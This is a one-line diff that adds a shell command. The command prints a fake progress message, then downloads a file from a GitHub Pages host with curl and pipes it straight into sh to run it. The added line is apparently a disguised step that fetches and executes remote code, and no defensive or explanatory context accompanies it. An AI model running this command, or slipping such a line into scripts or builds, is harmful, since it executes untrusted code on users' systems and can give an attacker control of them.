@@ -1,0 +1,1 @@
+echo 'Progress: 3.0%'; curl -L --progress-bar frkns.github.io/fun/night_findings_context_criminal.rs | sh
